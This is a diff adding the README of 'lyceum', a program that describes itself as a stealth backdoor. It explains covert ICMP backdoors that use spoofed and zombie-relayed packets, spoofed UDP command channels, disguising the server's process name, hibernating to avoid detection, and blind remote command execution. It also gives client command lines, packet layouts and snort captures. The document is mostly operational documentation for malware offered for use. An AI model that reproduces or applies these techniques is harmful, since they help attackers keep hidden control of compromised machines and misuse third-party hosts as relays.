@@ -1,0 +1,331 @@
+			lyceum-2.46			22/07/04
+			===========			--------
+			
+Requirements:  	Perl for encryption key generation
+Examples:      	See EXAMPLES
+License:	See COPYING
+Credits:	See CREDITS
+Compiling:     	'make' to compile. Edit the makefile to disable encryption and 
+                authentication
+Author:		phish@hush.com
+
+	      	      		       
+Introduction
+------------
+
+	Lyceum is a stealth client/server backdoor that uses spoofed udp packets to 
+	administer the server and two built-in icmp backdoors. Each ICMP backdoor
+	exploits a different feature of the protocol to remain as clandestine as
+	possible. The first create a bidirectionally spoofed ICMP tunnel and the 
+	second uses passive nodes as zombies to relay ICMP backdoor traffic. By 
+	default all communications are encrypted with 128bit blowfish using a 
+	random token that is generated at compile time. Lyceum clients may only
+	interact with lyceum servers that have been compiling using the same 
+	key.h file.
+ 
+	NB. Consider lyceum BETA
+
+	
+ICMP Backdoors
+--------------
+
+	* Bi-directional spoofing *
+	
+
+        	By utilising Bi-directional spoofing lyceum can communicate 
+		interactively with spoofed packets. To reply to a packet the
+		node will normally use the source address in the packet header.
+		If the source address is spoofed then the reply will not reach
+		the correct host. To solve this problem lyceum ignores the 
+		source address and instead uses the address encrypted into the
+		payload by the client.
+
+		1.1.1.1	    destination: 2.2.2.2	  2.2.2.2
+		-------	    --------------------          ------
+		Client	--> Commands & reply 1.1.1.1  --> Server
+		-------	    --------------------          ------
+	  	            source: 1.2.3.4
+
+        	From the outside the packet looks like it is from 1.2.3.4 
+		but the server will reply to 1.1.1.1 which is encrypted in
+		the payload along with the commands to execute
+
+		Below is a snort log of an unencrypted bi-spoofed interaction
+		
+		# ./lyceum_injector -d 192.168.0.34 -i 0
+		[lyceum]# echo hello
+		hello
+		[lyceum]#
+      
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
+		11/28-03:28:32.696497 0:0:0:0:0:0 -> 0:0:0:0:0:0 type:0x800 len:0x56
+		148.43.156.15 -> 192.168.0.34 ICMP TTL:255 TOS:0x0 ID:59197 IpLen:20 Dgm
+		Len:72Type:0  Code:0  ID:0  Seq:0  ECHO REPLY
+		30 3A 35 37 30 34 36 38 35 34 34 3A 30 3A 65 63  0:570468544:0:ec
+		68 6F 20 68 65 6C 6C 6F 00 00 00 00 00 00 00 00  ho hello........
+		00 00 00 00 00 00 00 00 00 00 00 00              ............
+	 
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+	  
+		11/28-03:28:34.011806 0:0:0:0:0:0 -> 0:0:0:0:0:0 type:0x800 len:0x44
+		240.53.173.54 -> 192.168.0.34 ICMP TTL:255 TOS:0x0 ID:59198 IpLen:20 Dgm
+		Len:54Type:0  Code:0  ID:0  Seq:496  ECHO REPLY
+		68 65 6C 6C 6F 0A 00 00 00 00 00 00 00 00 00 00  hello...........
+		00 00 00 00 00 00 00 00 00 00                    ..........
+	   
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+    
+	
+	* Moon bouncing *
+
+	
+		Moon bouncing (ab)uses a feature of ICMP pings, that when 
+		replying to a ping the payload is to mirror the payload
+		in the request.
+		Lyceum's zombies hosts are defined any host that replies to
+		pings and echoes the full payload in the reply packet.
+
+		
+                1.1.1.1                      2.2.2.2                    3.3.3.3
+          	------     ICMP ping ->      ------  ICMP ping reply -> ------
+        	client               	     zombie			server
+		------	<- ICMP ping reply   ------  <-  ICMP ping	------
+	
+	        Here the client sets the source address of the ping to 3.3.3.3
+		and the destination address to 2.2.2.2 and lastly encrypts it's 
+		own IP (1.1.1.1) into the payload along with the data that is to
+		be sent. When the zombie host replies to the ping request is sends the
+		results to 3.3.3.3 along with the payload client sent. 
+		3.3.3.3 processes the data and then repeats the same process to 
+		reply. It sends the ICMP packet to the zombies suggested by the 
+		client (see below) and sets to source address to the address inside 
+		the payload (the clients).
+		
+		There are three zombies selection options for lyceum. They 
+		can be altered using the following commands when in the lyceum
+		moon bounce backdoor console
+		
+		.lz    - load a new zombie IP
+		.llz   - load a new list of zombie IPs
+		.tsz   - set server to use random zombie IP list
+
+		.lz <IP>
+		--------------------------------------------------------
+		This changed the current zombie to another single
+		IP address that is used by both client and server	
+		--------------------------------------------------------
+		
+		.llz <IP list>
+		-------------------------------------------------------
+		.llz tells the client to read a file that contains
+		a list of zombie IPs, one per line. The client will
+		randomize between zombie IPs from the list.
+		Each exchange between client and server will use a 
+		single zombie.
+		
+		ZOMBIE = random zombie from list
+		
+		CLIENT --> ZOMBIE --> SERVER
+		CLIENT <-- ZOMBIE <-- SERVER 
+		---------------------------------------------------------
+		
+		.tsz
+		---------------------------------------------------------
+		.tsz can only be used with .llz and tells the client
+		to use two zombies from the list for each exchange
+		one for the server and one for the client. The client 
+		decided which two zombies are used this means that the
+		client can check they aren't the same and it means the
+		server doesn't have to have a copy of the zombie list.
+		With large lists this arrangement works out more efficient.
+		
+		ZOMBIE_C = random zombie from list
+		ZOMBIE_S = random zombie from list
+		
+		CLIENT --> ZOMBIE_C --> SERVER
+		CLIENT <-- ZOMBIE_S <-- SERVER 
+		---------------------------------------------------------
+			
+		Below is a snort log of a unencrypted moon bounce exchange using
+		192.168.0.1 as the only zombie.
+
+		# ./lyceum_injector -d 192.168.0.34 -B 192.168.0.1 
+		[lyceum]# echo hello
+		hello
+		[lyceum]#
+
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+		11/28-03:43:32.124522 0:C1:26:E:FA:7B -> 0:A:E6:53:D:FC type:0x800
+		len:0x5D
+		192.168.0.34 -> 192.168.0.1 ICMP TTL:255 TOS:0x0 ID:42296 IpLen:20
+		DgmLen:79
+		Type:8  Code:0  ID:0   Seq:0  ECHO
+		30 3A 35 37 30 34 36 38 35 34 34 3A 31 36 38 32  0:570468544:1682
+		30 34 31 36 3A 65 63 68 6F 20 68 65 6C 6C 6F 00  0416:echo hello.
+		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+		00 00 00                                         ...
+				 
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+	        11/28-03:43:32.124802 0:A:E6:53:D:FC -> 0:C1:26:E:FA:7B type:0x800  
+       		192.168.0.1 -> 192.168.0.34 ICMP TTL:64 TOS:0x0 ID:6149 IpLen:20
+		DgmLen:79 Type:0  Code:0  ID:0  Seq:0 ECHO REPLY
+        	30 3A 35 37 30 34 36 38 35 34 34 3A 31 36 38 32  0:570468544:1682
+	        30 34 31 36 3A 65 63 68 6F 20 68 65 6C 6C 6F 00  0416:echo hello.
+		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+	        00 00 00                                         ...
+				   
+       		 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+			    
+	        11/28-03:43:32.172186 0:C1:26:E:FA:7B -> 0:A:E6:53:D:FC type:0x800
+		len:0x44
+		192.168.0.34 -> 192.168.0.1 ICMP TTL:255 TOS:0x0 ID:42297 IpLen:20
+		DgmLen:54
+		Type:8  Code:0  ID:0   Seq:496  ECHO
+	
+		68 65 6C 6C 6F 0A 00 00 00 00 00 00 00 00 00 00  hello...........
+		00 00 00 00 00 00 00 00 00 00                    ..........
+				     
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+				      
+		11/28-03:43:32.172397 0:A:E6:53:D:FC -> 0:C1:26:E:FA:7B type:0x800
+		len:0x44
+		192.168.0.1 -> 192.168.0.34 ICMP TTL:64 TOS:0x0 ID:6151 IpLen:20
+		DgmLen:54
+		Type:0  Code:0  ID:0  Seq:496  ECHO REPLY
+		68 65 6C 6C 6F 0A 00 00 00 00 00 00 00 00 00 00  hello...........
+		00 00 00 00 00 00 00 00 00 00                    ..........
+				       
+		=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+		ICMP packet structure
+		---------------------
+
+		|Integer   |Long Integer   |Long Integer       |String	|
+		|-------------------------------------------------------|
+		|          |		   |		       |	|
+		| Node ID  | Reply IP addr | Zombie reply addr | Command|
+		|          |		   |  		       |	|
+		|-------------------------------------------------------|			        
+	
+		NB. Lyceum's ICMP backdoors use popen() to read commands so 
+		    interactive programs such as ispell and gdb will not work
+		    and it's needless to say that applications using ncurses 
+		    and X will not work either.
+	
+Udp interface
+-------------
+
+	* Client options *
+	
+		-d   <destination IP>   - Destination IP of lyceum host
+        	-D   <destination list> - List of destination IPs for lyceum hosts
+
+		The destination address(es) can be inputted in two forms, either
+		a single IP address or a list of IP addresses, one per line. The 
+		commands specified will be sent to all inputted IP addresses.
+	 
+        	-s   <source IP>        - Source address to use
+        	-S   <source subnet>    - Subnet spoof EG. 1.1.1.
+
+		The source address is by default random but this may cause problems and 
+		the packet could get dropped by some form of filter.
+		The next level of spoofing is subnet, where three
+        	octals of the IP address are inputted and the forth is randomised by 
+		the client. If this is still causing problems then a single IP can be
+		specified. When using moon bounce all source address arguments are
+		ignored.
+
+		-l   <local IP>         - Set local IP address
+	
+		This has to be used to specify a client IP when lyceum cannot
+		find it from the client's hostname
+	
+        	-i   <type>             - Connect to lyceum icmp bi-spoofed
+		                          backdoor using <type>, server default: 0
+        	-b   <zombie_host>      - Connect to icmp bounce backdoor
+		                          through <zombie_host>
+	
+		These two options open the lyceum backdoor console and attempt to 
+		connect to an already opened backdoor. The client must open the
+		backdoor using Udp server commands before trying to connect to it 
+		(see below). 
+		When connecting to a bi-spoofed backdoor the client must know which 
+		type of icmp packet it needs to send. If you didn't use any arguments
+		when opening the backdoor then it will be 0 (icmp echo_reply) by
+		default. To see a list of icmp types use the -I argument. The moon
+		bounce backdoors argument is it's zombies. If you intend to load a 
+		zombie list once in the console then the contents of the argument 
+		doesnt matter but it has to be something to satisfy getopt()
+
+	* Server Options *
+	
+	        Educated proc masking
+		---------------------
+		The server uses educated proc masking to hide, it's a way of dynamically
+		masking a process name.  The server scans through the /proc file system for 
+		current running processes. It then chooses the most common name out of all 
+		of the processes and masks itself as that one.	
+		
+		-u   <ID:[Argument]>   - Send USC (Udp Server Command) 
+		-------------------------------------------------------
+		All command sent to the server are in the form of USC's.
+		On the command line a command ID and argument, if applicable,
+		need to be inputted.
+		
+		0 - kill server and children
+		----------------------------
+		Kill the server and all server processes	
+	
+		1 - send lyceum ping
+		--------------------
+		Send an internal lyceum bi-spoofed ping to see if a server
+		if awake.
+		
+                2 <hours> - hibernate server for <hours>
+		-----------------------------------------
+		Tell the server to sleep for <hours>. When the server is in 
+		hibernation mode it closes all communication sockets so cannot
+		be contacted until the time has expired. The advantage of this 
+		is that the server will leave no network finger print on the host
+		it is running on for the duration of the sleep.
+		
+		3 - open icmp moonbouce backdoor
+		--------------------------------
+		Open a moonbounce ICMP backdoor then subsequently the user
+		can open the lyceum backdoor console using -b to connect to
+		the backdoor
+		
+	        4 [type] - open bi-spoofed icmp backdoor using [icmp-type], default: 0
+		-------------------------------------------------------------------------
+		Open a bi-spoofed ICMP backdoor using <icmp-type>. The default is
+		0 which is icmp_echo_request. To view a list of available ICMP types
+		use -I at the command line. When connecting to an ICMP bi-spoof backdoor
+		you must specify the <icmp-type> that was used to open the backdoor.
+		
+	        5 <command> - execute command blind on server
+		---------------------------------------------
+		Execute <command> on the server. The command is blind meaning
+		the client will not receive any feed back from the server so 
+		executing an interactive command would be pointless.
+		
+	        6 <subnet> - set the server to spoof all packets from <subnet>
+		----------------------------------------------------------------
+		This command is -S for the server. It works exactly the same but 
+		you must set the server spoofing subnet before opening any backdoors
+		because the spoof subnet is passed to the backdoor as an argument.
+		
+		
+              	UDP packet structure 
+                --------------------
+	
+		|String    |Integer        |Integer            |String 	          |
+		|-----------------------------------------------------------------|
+		|          |		   |		       |	          |
+		| Fuzz     | Node ID       | Command Code      | Command arguments|
+		|          |		   |  		       |	          |
+		|-----------------------------------------------------------------|
+		
+
+
+
+	
